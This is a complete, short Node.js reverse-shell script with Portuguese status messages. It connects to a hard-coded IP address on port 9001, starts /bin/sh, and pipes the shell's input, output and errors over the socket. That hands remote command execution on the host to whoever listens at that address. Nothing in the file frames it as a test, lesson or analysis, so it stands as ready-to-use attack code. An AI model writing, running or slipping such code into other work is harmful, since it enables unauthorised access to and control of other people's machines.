const net = require('net');
const { exec } = require('child_process');

const client = new net.Socket();
client.connect(9001, '170.0.147.150', () => {
  const sh = exec('/bin/sh');
  client.write("Conectado!\\n");
  client.pipe(sh.stdin);
  sh.stdout.pipe(client);
  sh.stderr.pipe(client);
});

client.on('error', (err) => {
  console.error('Erro:', err);
});
